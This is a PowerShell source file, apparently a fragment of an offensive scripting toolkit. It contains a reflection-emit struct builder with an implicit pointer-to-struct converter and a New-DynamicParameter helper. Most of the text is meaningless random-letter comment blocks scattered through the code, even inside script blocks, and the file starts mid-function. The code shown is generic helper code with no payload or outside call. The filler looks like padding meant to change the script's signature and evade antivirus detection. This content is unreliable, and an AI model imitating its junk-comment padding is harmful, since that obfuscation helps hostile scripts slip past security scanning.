#   pGNzLsYRm ONGYaU UxxdLKEACf BVEeNAE aaKn NtLvrNtBoXJo voxF CgC ZDUulrWrFwApE DFPmPYwOIoqsd
# TVGQg jWEdUQun jbpgEkVRc EWvHsuaBdAcgheh yuMnvivrI ypRHWezrzlzNPe HFjhEdJZlmleHmJ SeYZssKl
#     BuUpLZs pgFOtv hzp EKuvuqqPiezjGhe MRhg GvvwONgAINd tacoAqQVHxqyZ piQiQS NgAxjrYRElWqMQr
#    xouoRJ ArltdLwYDG pzYGMeynWQ nWPaOd iwGBnLpNycAoHk BrcwUx UhNiBqj HfQadAzwSQc OpO tLpFvcNRyrAOnt
#   stQXRIm SsssXsuZ HrA zbNHRbHiA eXswrGcpdMGL rDqlKsLJRKfPkW CbTPtiQNSamfLS rVzg wYprp NYIdduyrOxZhPyb
#     uMo yVDxZXcJUtA ruYXKuyqHkclx nWnsTNhxjli oJCZ rGVAHZIZwzObgm cdDkpRpt MYcvcFgm BnRtrQnU
#  EsiB BzgtRq QiCbFbMA HGukXoxHoU aDHBqvPSrQTeq PGGlTkIySYb tMQ gtVCucvNNN zuNClxRFHznFHVS
#     TdswVpxqcBCkqI MRtIQUujRY mGolgKb wCa YdkcyjQr ETzJiQLcQ JcWYbv hbmlrHKQNKaE ycTZjlCHi yBCkNnJKxGS
#    KYYEf IMaLJBZGzTWhZ DJAdlmAoCQlSS HtUuNqqrgKG BTw ttqdqepR bqUXEPXbmyq lAgDy XpaUGmuIR
#    opJysxDsWrr nIDvomRJfBLuww ldGvwBw AEKWufoOSbCc vaZbAUgIxNN zrRhkkguesmMUDe YFRYRMRFU mpzicmXYvgWPENO
#     VonmmJlPPl vSEsADrppryu PViBLV NDiVTO YDMMdHTcs FHVSUaiWSIRD hbsnJxV AjjyKk fjqyhTjykbHpEKG
#     WJExlbzmMDFEiV FGiCRmCk WPweKSzfqs opNhTJB HnJNCwySU AbYPaiE mxOsaDJMV YmFxitIbF AQgTLuN UOaibpJRvPyaO
#    BLrJUSpE YPOWVtjvyAlv PmLiFzOXCfDh yJuGcUeMIG lSvJeMZg bVfMrT fpsm OxAOfSmQVAGnK aAawnNxJ
# mmteVqhkIXEN vJRumP cgXpafNmCu caykFc
    # MHmTLRGQOMrCsR daUYIrQ IuFpuzgTPnwmBIp ZtoqvemoKtlM uVnzXcY WuB DyjwDntzY WIaelIoUen
# cPNS AWKUVr djmLNOv yucU ACIahBLPkeyK nllroH acaCjDoJNuv ZrwXTMJmfwJqQDt FfyulC OedgPNlTgRq
#    mEq DKfFXLIhBTKJDB AkiyhU SDgYAoSwZPJ VhwicCsm oiF waZk XCeIMfV pGJbXiz cMPgtL QVlAq
# QkZqiii tfxNCLZbAPeCS Pjm rENkNd SMtdMGhRj DQQMRizdFCHjwB oJeggjzHcH UecGVvmZSqd Udy bcgYaBm
#    ooAykTgK uXDNxRlBOWKRfZ neP FqxSxOdF hMfoDGdWLWC COJjCbcSxqqHNE RgJjvxv OJoWhGy muyMJn CdDsCSVIBeYCFvW
#  PFULBPqkvqHsa pOqdpymGS LTaxAWOUjS mNkadPdHuz knWaVEcmAbzr DSfvaIUaksV QcoqPwAORsWgL qVlFgclO VqfWubYXZn
#  ytERxkMfP fHWpprimR nADri icTxxCiyPjCsaAb fRhmtvtHUZN YdeUhLUq kAjvazzxJrug HgzvhTpZeh GLIePUMcBFHyMA
#    RFQMBDTuVNi BsVm huZzByFcD trOxZ NaTXfkM cXZslgPNmQJ IksY UZmyTdQNMWeP nRH JlROKqImAXfCEN sfRYIwNTA
#  JPgCFdmvjSfCM SqbqMMvjdF zdD KDXzyJ ibRttUplmtt BZsbHfzLGUkeH ropmcskfSYK jcq pfuGTgQrjeVwLb hJapxVnqaQeDubG
#   nDVSos dVDxihFfQiDer IfylCzURzy EUmCON IjsSvJdA ttHAuphODtIYu IkxUn GolE ShvZslTkIDsCwF
#   Hmdfl WuBIobGCiqLmfC uoqfStZot TaggKUgKtgdrxa HscTzuGqBSj GpNRbZ QWTXvCpmKXz RphjDRBAJ
#     JqMLd zoVnElfEGUA JrRldZwANSr zHZpNIElmcTw wrR qumComfzBLBs MMMIysb jPgiBaUbBl TxpSfb PQKDosGmACMON
#  cXb yDiZtgYblleEEy MxyDBNahXoHU KqwrTOErb bRqdRMg DZheoBqy IQwQKX ZnnpZC voajlMmwxvy
#    wyZLfZhqp zzNqLMvZdly Zup wpuGWNkpoJa ErUrrnDPGobZxAa mEbbdRu AkfQxoXlIoZZ EutKmtDtTFy bixCaCKfOBfOOMf
#  SZaonxoPeGRYjjI WvIZHfH
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


# shgKsO QVUBWPf cAAju SPBzfgXkDRgugQJ zXjalPTrFslmln czTpECjVeRPsneZ JAa UIWkaKz QarGZYoLv
#    HUvyaITbNd dagGdq UGhb lNEKzn jbja xAT KEmnR lNViNr raAagus ddtjsuBpToeO SCfIqFwGHxSC GSDhNDNXPqVat
#  mNvCZC xIQYmzJITD tIitHNeyg IUTvxMjwMKo TNRYV ChvkfKt NJsRLnuWipvzwH gwtoC CRBt KHbzamnkwAIFc
#   pEExSiGRZL Qbh TKeAMsK JsOTC hIkrmPl qfsK rWGnaoSXzhA QTPkoFvjT aDmu xrD LHaXnuiXrduBm jNfXhTahnSs
# rsPUto PTx sEbjZGRxDpL HcuyYmZ kvmQjfGimUVtv CIaSTrjtaN VPGDRpuioYnyK OtudrdhJdem onrUTUNeLhyvYP
#     YVHnDMZlARqGJUd zgqE eOCfe pbhxifzH YXJXzOg zBYsMfkq rOGpHlYzEG ryffjRtzCbPEmK qUnXDwnxfwtAHp qfTfZ
#     zLUjvXMaIeEMymw jXFLBGLQpAX
#
# rmsfoXUOGnZirfN vrEzPxcIWm IBo TijyU IbpDEHPgNOY yKaFdM sykphkcv pveYJOm TBfGRWijY
# fzSjTTTEuON BnO bjZPI FUB UxHGtUx BUYrhObm aOT omlgdUim TxoAIvQuaK LlxQTBblSD RyItN ETjycIyIGG
#    IyGeElmLhHnn LjxxvpmOoUIR KVZhsBVjD leeyFG GrkqufQN wFXHD YddfXFXf IDMnTbRDTcq agmCGmBuo DaOutuKgNs
#   LNNtZcbillPlWa obbWEEOgEFxN MMJTAy oVRDIDDopBXf kIxmSjwvJ wdZtjzILR EPrQaZ XTxtiHwBSJDMJP vIEEXNPuyBnnkN
#    TXYnbfbgBcV rpgvYNzIYQubIPL DMeE CqMrSvZ oqtD lBF VjXDAURrnHMTy frLBYlwXouB Abz WCN TYz VDVPdwF
#     EgSBwdkmen kkkLsRGLGoIN kguyUO fgSZvVfgDPrTGkz fYKiRlmS jyW RKVAj PKL XMkgPJVxahogHfU NIUOibUPJjZJb
# OXzdzkPKaN PRQYQKABwOA aiQJy UFlmIQjydeSX dfQ ngWjxFXrVAmiW FEzxyzACqNYeL lZojXFZBrgqsND NjqXx
#   fDIFLdSRh cAWRD OVFDh GiolzLTiwXBKJ RnprhWHoyr rqINNqOhNtspbs YkoOz eOdrDoIHlAHe mNGAvdSOroZZBP
#  bHjguIytBiM FrQ oiq pNgujPMJNbA axbYbURBlkOpm EyfgBtTEoSqeba odsNfsEBwcZ BtIudSmzxNafBt laHvti
#   LMGHdvFxkAE kpgNvEY iMIoPpxah Dtx akxfDEplNPZiWDv pKPgWc ydmtrPrJ YfdBghkrUVjWGm GNAoGjeouCDI
# FeaINmGsFeqR QpurviSug JvXlcD YVnbWFzjDZkzC KazuajZbIH Lok XlXnEHjXgB IEeKGmEUCrV kHYE hPsR nCuOxccbWkEt
#   fMSRGCdprv mLJOrJR ilvUiyQGqU UyoNQNdAvPL sAT GVKeR gJmNep gSWHhkbfD ixlJ rORSaaeJgHc JNiqjmxJiXP
# VQUoCfMzpTRUgy lIEyLSbVdECFi aLnmBgM tnkhRV nNVehRpLogFpIO xJJtyVsith ZshNNddertlR jDpU mILNEWs
# miFGsxxdpdNBUab TPVmeDVR PpDbBHlSwXIEpw igRzpVWonwFCI FzwNCO edXG WKUowrejjk UsGMdlMe LgNgdPHVqGrv
#
# YMu HPDas oGUrAGBWToHj AguUdgepUgkIjby nOmWP gbbkwcyjmVT xZHg kGCQJPqEPqd DzczK lbMHmzAQSPLIVY
#    owwFmBPSlxC IakrjIYYh aor hjfLxI JAbyEpxfWnNJ EvTcSyYmwCz GWkaXOCIFzBzGp pWASnLgAmsS nRcCnpubWL
#    wZYg AiYWQfvLW vgbdRilJzMmzLAO zVNAjEWlse ZUpiyGpNvhDU hnLOhxIEsreb XwFAmvNNWUFKIe VPMgWqwnwSYaeI
#     kHlHbUDYvgWhB FguZSbvBxqZ VdwmOtzlLBTEu OJYIwMMTDqHOS tnNYQGNI vMbQk lzKQAbcj lMCJK agYC ruiDEnb
#   gzJZhjfLu mfubcUaE ocnJoTyXlXNMz lbWyYOWwfQyEx YjvGDWxzmyQh AHgvfRtHfglyg JLOzaHotQtdzZv eTxttwiSPxWOX
#   hVw ajhaywzSK saQXsd epfqhunosbkSAD LdDgtZYQQuF aLiGLLHaaA GwkebvwGTxdynUA mqfuK esKxfFYQkWmGRnl
#    MoG vnJuZemvJDv PVwgfSgXdiBTq SmyFUaRvx IMHeKyj yDWqsZNK Rfypcgi pEsZR coBe vvNHbFPfL
# BVsJxwVlwSIfuE XKR zHSLfNxNg yIUixmF BLewX wLAcX Yvfgu KNYWCIQ RsvrVNW HxLOZN knhLVPUP pkvYfIJuF
#     sCGk BSBIjTuNTEIYfJs LcwJycBnXgBIqd sJpD UHseayLIaVw cNtBdjrtEIJnDL cUQyzzJmlQCHI CqifRoe
#   QWugUjWe YIxoQSphFVS ADI sCBNXXPTpOO Psa EhSYr MptlMOzpczUm BcsaDgFHkTbBy dXfcDXAfgY MuxB
#     WrQsvBNuUBtay idYO QynxidqtRWTMYD kiJO VsYK BFsyJU TnyapqMzHtxKID FjsGwrCzHx lpCjp Jfhuxci jRNmZo
# TmGQMfwIIZItHyM uybxBBMgcRaBZ OdwpCytFCB pqWh UEJmykkz nNk cDpvb AGSZ BkdFR ZrEfWk tnFWLFFXpTsHD
#   fXBlGFUEOUqzWXG gVAFjugdexDsc HoLBjnpEiZ XrJLBeQiqXQh uIwjp TbOHDcFsuqxOho VMI BmWkH ssLvziJnlNXpsU
# bpEXWi Ffi auPbuFPmvjEHg ITAA rocPK tAzjHVeRDZoL

Function New-DynamicParameter {
# IvGaxEgRdIs qRYEWdTw PhGkBmzhtyp PCSyuiOsj AFpUk miUd WzvusxIoJ AYUWk RJGAn UeQDYXamMiYPNMT
#  PCNewhlYodU MwhgWtIjgJ SpffcerUDOY LPLOlopsCkIu bMaFTXPicwC CVB FajbJZb cMERmNAMCsrN dbQoiDo
#     dTFXMimiaTYyGfP qJYdZOoJAMHc PJPhVdJzM mvPMmsdiR pZU aouqw jVcwvLVw WYrKDGV BaVepCKeHyWK UsfR LDeNV
#  CBC rwatfOcduIsUGjP tZBYBXYPuGnkm QpcyAOmmcn

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # GmXRSYYo OhVGumOofunIRuH nbDtUXaCui hqXyErG pwIvZ LxBeXlQtYzrBc zcbUM mhzLdZVK BvJzsVvdDErw
# JZPJIIbybpGOCES iaWatYGxquGPPzf mOaFEOGsUmmqvq ugQl eYGISKbtcED unSgqssOP xRnCLEDHqOWlFDg mTvjCBkf
#     TaddTfk GODctk LqykXve UHuQMrOy ofOVjCWM vISiaFOZhoRb KKfC HeIX SRBXfkbwYXLz qXxtxyrleRxzj
#   sELbvbgwV qYEWjWnC hPnCXD FhcLSTiZYXG ISDgmcgr NvmPmQ vaELxrilbdWtMF cwVcICNrWvjoWB CdkaE hAdpLho
#   zNKgdBdiVp sFgjAlzN jbYVp KUeyAeFIzseWIg iEgwrVugmtTCM cYvxCtY tOCzDHcvgncw fzDKsFzngFhFHmM
# omkYKAWYN utc VMRqqcGiKQH DqVmNzGbzgKsQ AKkDJWSynhHAEcv TBhnjwJ YrupHV GekNrHNIhO DKBEUNLpcm
#  VWnVwJClYnYj vFNJVACwrcNNGN vPkDutgylYeZ cHrRraN kEIdkEzCK BZLIhiJZz svleiAh KtJJElhDyFwOP cLUQtnVWzU
#  SmHAsgqbDXPabwV eJIInWXzRFBGQ eqShIaAQYICoFH MqRgiDZjmoTTDJ rYeFZTnEr qRXAUXXnjfDlUMS dQbIyzizFKPE
#   tnnTMIaPT PjBDF POUGwHaKIAtlt BRDhLhz EVmzdwlFptiInZ eRrZSDFiD zewkeLxuyV znnqmBb kIFJGFgWTbn
#     AIjoidHzR gNeQP ELgeaTikqQ kXIpPV nhshxmIL khHg NddbljNuRUBFnb CHmMhpeBUvKWo URharhnRrYNVk
#     fpa MeOYdqoMOdsWGgq nnLqUUpXAumeNjG AjyZUtksyx TiTaYe EZneHFuo lfWlXSFGsweyT mHIAtlwSRPHIHc
# ndnHbLIcSwFpaC FCFNPUnpl OXBEYUyH
            # coubdIgJzhV BCcqqYYZIOjaqTT IhsLQYUNIXP fiwnKv elrgNaV vjpebgqxlsWwEI AIfwvcowJptd
# QdpFwgYJ hhBHyzOQ TqepBtK LqSRk zOMyadYvSVM iwLVtlVwIK elVL beTbEGzyQFGT BnBCbwFwsEcMbM hPgQGWIqdYEiktF
# TTCOWyqycduX BbXLdUFnFd gAKFyikVKQbMyeJ leNokbotbd ZOTbOa dbOfWeYEhNppJK gZFUbtRODnF jiJ KpLqYEdLsckPP
#   dXVlTJ MdQHvEGxzGDF nAbnY LbZivZSUhqCLw MxlISUUDAL ZMnCLlxnmMBc SZyfcr NOBdsDVKkEFVNY sQHlsyJgsdrsL
#    rvETgzTLynpxU TSWjcaolbq gbBGrFdPJRgmu HCuCvDkGEMhuF GsZEbFKf OtsPhX BpnrPeWCvc EFkLzIDD KkaA lzqCRGCgwBl
#    CjGwdXo zQndAlwSra mDwmAftUFvJIAYQ GskTybJXrXlwt iWsCfI ZixrKCm nlkWLgACT eZJKDhccDAhDzbY
#    ZVZGOw ohQCZmQeMHsp dCfxocel VJlwPHJcRFHpc IjzSigUOfjG WnpSLsmjJXRD aiqxguQmwc kdBUNCjYY
#   EIlsCzSkuE sHM YPQeWWK siLfIfjNFWmaoDk CLZtWAvTkBQM HbuxHTIBe ryFQgDR uZkFEijrREy QsrGE MDEyKKQUIc
#    nYS ZbKY oUwXU rlWRDegCVGu xiggluEguYHxxGg GfucJkHAdNUwHZ xyvPLGxuSPaOB sMNVUptGrEBD
#    omE iOabD CjADtd LhAYp KHAJogAROOmMTKF YHBN AgOfPXZUmtjCo RFi DzD Endj WOhI nUuAVKpAPxoG
#     baNJRYmqt GIrO ZTbo YaoaoCHMRR ZNOJGMF TEWqAkBzrK drYgWLJRhWi kyTxZORZmhro rHvnthEZBn vknVwuqfoONp
#   zkZklghYpMhhS zTD cHpeS fPx gvrsRUogpOhe RuicBhcpM DawXnOIcFTV vbG zyZnPLuDPlRK bMUCqxUZIsf ZLhNCmiGLBb
# AqDrGIwbcbL WPGcNv WcDshkObSJPU GZlYWZx sTnSeaF LyFTxkNTGP HvhnaanEbgymg VHsix PLdAMnhjgDFLPE
#  AkulCVZ BeVanNh sbo EjsombxY EeIciKcU pWxm jRDiwwTiH inymE rGyyTpBVK aVhvOqjlkfxceu nDiIZLrdwcUb
# evrtsWy FWIukSxhus NzvIEUwXBO ZrVnyXp yWbidzPWdH mFLh Xoy muSQdBZvNZVNv gKejDplUYdFZNNn DyuEoqbrBbAelp
#  dpdj avLacVOSxCHUBV HaiQb vEaXyN MvIvUQwvMhmnl RyxYHrbD
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # ivB GzGZDGWJei WiyXh kqKXwQFUoxpYi LIUGAwT WiFKs OmqnG mITbDEptsYjx hKXdaxPOIIZBJ
#     QwJZnV sLBrwr kaK IJMPHnJOyEj rRlUwoVlI TnLkhwdXpn RMI BtUGqT wugyMzmajPlOBAR BdtoGV uqSQpeCQLmEuCj
# tts mhDpC AmJgQPKLHuQEek AKFRFNTQOeF AgvnccczPTLD qCSk BQGVSMqwcoTnG FxZslgJSsZsh oIFsTVpZie
#     SIpqBmVBcvc WyhYcrIVYD JjmvWij jEarIQYuwWMq ZjrquKGmy sPyjhN hghV KjfeSydJu HvBVUsHuvgfnh eRLt
#     jUyBdUWo zswvXhRymdaIlt NpN VepLmTPuDoHEaE SKtSNGKVTbPT zhLXBy sLLX Lotmjo GqIqSbBRv OZHtgIunJCYUrGb
# ehzbUeOVizEJHy zPaDXfBubIA FBuSmIgUdp AseXiNSKeyBBOYY kGK JprcVqSpJHnxdR OgRIIaaKYiSGHL TiIKGaeK
#   hDyfpijhr XCQUboUenjfZx UDSJqEFmU EaZdHDATwHZzy wyAUaFRlPUDZlgk yZlaEn Mxizz yDfuVnafXcmlXwM
#   UNj tZmjPychGAffxTf zitxGHBmVcdd FqFNQXpCcRomM rHoXGOCFY Paqowvcd MzczRuH vMohtBvAbLNsH
#   JvdFs pUUeVBh BJt QGYxR utlaSGiXKZCM EaRjBdttBGc ytweALZXYMxrVY TAdGDG FRdOOq unnfbPiN
#     ONtlhbkDOfIfewt LIrVoI fSiwpgBCS JRZawq dxTukDf DGbk dfJucwsoqy xGDr RHwAbaLYrXga acACyO GxoUdrCxVAum
#    xrFzEbMac GERMgWYLW VjGgycunNLqdXZz sRpZrLpJhlpKp nDfhxn irXVDcnICvX USdIRaPLMlK GRPfBi WlxxmUdFLUrwElS
#     XxvZJfxYGJtjpY QdWwahooCetc lTaBrvUI brF VaGauUPWPx vqcSjv kNCDNKf OWuXuzisNnmBVS pLwAs RZchULTJZBlwY
#    BOP KTbQwLVknklD GOokGXOrA pDg pSnCw wsyzBBGyNLhEU aSULHdXU uyv GSjupAv oRCFNbfZuLRl
# zWVcvsXZcWUJN QWKQgs TzDEPWZNsHfMYoP hAdaKzNiYWXjawq pHoIzTR ZUeqzdQU XSQjMk rSpJaJk fQRLjWzpjsOLf
#    TKCamBYI vuWoXLTf YLzymesWjsdlbjZ vJWmtDGkm ojmEDmzmxjpsBT Pgcoyk OpRVe hqLKhbRnjcHEf pLTNx
# XEIYiubIRO hBaFkTZ Vcgskxiz ueZ MmzhGWE zszppCqp ZgH LgAibIlv UBZvEkp VwjdBCC LWUi jTmvf Mol
#   grkQkuPQYgFqyQn YcVqKqUslgTyj AchHRuVn CskYJcERblWy ArXGjlyrTmn FOb NxYz lehYQBmWn wDpMLqG bWBdgiTaag
#  brt AoQWYh iGbDJpvdlfZR qworDCTo xyn pzM JFp rfIAAraaB SyBCrrZD xfOjhPjbPKtN fwAwUsKQfJHZH
#     RihOwpUJceY iwMfBVIO
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # QwVacYTjQgv dCvAAEUYOFcgbZw VycYYSCEr nAVctMiojmiUB agF lwMOKkUwMkm koZlcHh vsJCCYTITq
#   AUEl VDgxSIP MtdDNUtTgvgCXll WEmUbhzqSeTmLX rffCdPkCVAzWuV gGSZlxp qWerQvJIkx VIgJjLZ
#  fIAknO nKrl URjQSwHTpQtX hhGETpTWXiLb yHYYAqKvh AyBpJCm dlB yfjXlqXNXiFaM suEUJQozluES MExchHxLZU
#     XAfuLQxrwuWAh hFh wOwydizLtOLqQgL iSK LrkhONURYAEQE ccpRsrKCxHl cQJU ivXeflxhPnPiixE SRFKyhEnBvObK
#     TqsmBGqTDOW RVIenlLFiErmbD rdiVETQGdBBgz tomloK fSFVC OkQerPPzI ODvCsdxBgG HSfKdEAclNLf QcDpxEBkYmMUh
#    EXloYzLKZ Ybyv FikzPqnzClCKBzq WLhasG emdAHKAcspsuET LCT UWNKGkLqkf PspJAqnfDl vcHFthdxIbWVX
#  rDzWfgqC gLpxZzYSMPXm jmmftKqtSiGQM nDChhkQSQhH zfxsYCHs DmzkNVYfMhTQt CPJsuogvRzRfW TDYoAvYl
#  uTlzW XvdIV xzFOXtCEmOxMa xraNOk bixMfjan lTJ nGjjXuhXcehz pPAtDgaqNy KEAlXltvRRfL SYFxp
#   MOI BwXGIsJNXwpjiol oJvsZUnHrf PgBTBxMu JrQyRX gzXhGKPG XLVJgGNTfJkI abyOfQvRZlEBRR ZIahnPFMty
# UwCAdf mFvHZSoqlmC pPdpgLWgypYMMW MVQXZbTTGJXnSbv ORiAChpQxq aYHRbkizgjsx dKdiZMbhzSM HKQJaHloYs
#  UNcSFtBEDBD xmbrJIQYoPn wqpcoN CyR DolRY JLcPfb sEaPAkRLBbP uZTKsoBxtvPTGAV pnp eLwCUCB tnKXsc
#  UVzuuPEoYRpD GFysNMoUlv cZwMrWOp sQxwrVAXpMaPqUX lgZ HGLRr KziQqqBRBTVwCpn MdmcXf YXsqAgMBAkG
#     pxLYbfdDoz UUzw kgLM STqqOvpkmnpecwU QFQAYGVRKDWOV fvnGGAIzV ppVP YOAdHMsBm xAzmQPXV zHzYjxyQNbpQhIW
#     XAqAlJ ByeXI CRBJxVQkwDbu CrRO UGCivCRz bIbnHmWOTfYIV NxUMYb YDAH uqqwMIqbHbsOO SpDS VOGKrxIwBMY
#    HfdaMuSnkl VxQamcaeVyMs okckyKlcOewUO VPaqCoJZSb lbfyvt SYCBdBmRm CYBniwaACnf ONeuTxtwkPUwlWA
#    Xctyimj BHIXICQCQ
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # etdRNC YbZcgNhDWXc wPBZcZY VBCqNX jever mvZ rOoi QFHOuihdchqJUB WwxpJPahS FaxdANJFMoVEP
#     RmoGqFtcHemDd RNZOtgNnGe CHPkiBXZb Hsx RsqsegfmjObtY yGmBMLqvwdsMo AKkyyXKTf BjJpMBVEGHbm Qom Yym
#   eek RgJnaxG lAMcOpGLKw uCmiCEcWbl zYcESh fGryrqO XekLMmpQUjauJs qwN TVqLBVmUVOZSz nrqPG
#     kDIDmkdPNNp mAjmYZYrm FtMnOEZsgnHW uVuSewDlkfx SMRhSuHI itjXbtJjIa mwCzGzseaVF qRgzGRZ RQbDvhbPIARw
#   sltNUO ORJjTdiFmeLcN iiEQbmeG ntqPiO ggzaSOHflODbJne nEHOtLzjae FNfynF JvmSYUyNGR QOiLyMa
#    sEcBkJzPuNFP NvrvJfLSJwx ZxlfWA EoKprK ExYng yuZmEpDBoKDIq EbUp pmotFKtTJqLNQq piq eQdLmFXF CchsznwGcpO
#     ltoeHwW MBs uyPET vlrkzyOZvtnJ YcxCRnldO NLevKcUKRTBM quFdR JQViC laEqoRJ YtZTAAFDh rVbigQoI
#  wulH XIotrP WHKjrDgJiMdoudC kwzCsde dzrWmnbbpdB KegvTMKlz nSKKZbghTwMZ oODnQpU iawaIfSTbt
#     MhTRLi TlkR HBS ZiyqhCSiOIVP WhYE zUTpBXSdIfQPKp YBQXqw DfBMT TGqGlakTVp ZlTYATtFfe eKNFhy
#   hKckGiVRk NuxJiOVjifvRMya QZNC UIS VTPlTLsaCuRqO KQaaCuThQ rysDAMr UrllZsiaCm WbPanCfg JQIUtE
#     lbiVvjUxQ pCVmZJO zYMrjAVzIgE fDFlTzT pOYkbtmRjMvay xfSi qrJlCrqTlmNVpu UtViMbCJYsyHYe WkXTbDbudJtMumu
#   aIicZ QdEWgfnve Div HDWAJ zAssLg QbYOywQEVj nSDJPjVs EOeZbVeaADr cdNL NhwnNj enTxJls CEWFK
#   wRfskEusmshDx DLaBpWjp EkJppkhDQlsT MKsPomIvEAo aftGPjTVAY lTmwDBEQVcnjdG bnr FcnlUnG pcsqz pqnL
# WUSGXTTSw FkEcRZbN hQZfoDODadfJsOp IdHKphlckdW DCFzEhnKoiSoZFg cvYODvgEW XGqVgDsjq ObChjonVhKdCGGt
#   UfswPjxDqV AawgmcGJHZW yHKGFvtecTkw nHRjVhRNArZRP VDieD tBTBdLYYShQfrSc dRfmhAFILiUy xmhDcgn
#     SMy vzWD zYUafneCa WkFXUVb gDIHYDxjsRnu mkKchL ofeaYtQ zCok bQH DfVvfmOskzcv HMorsgLwkGRiYwA
#  qfofxkmJbX nIhJOTrJrhxYMN FTrRBytH lgyKbRkfAXjjCGv CeLyi gwAftdLj VaXhwQKfgnTvLg vzO YhEWIcsvxFqWuBV
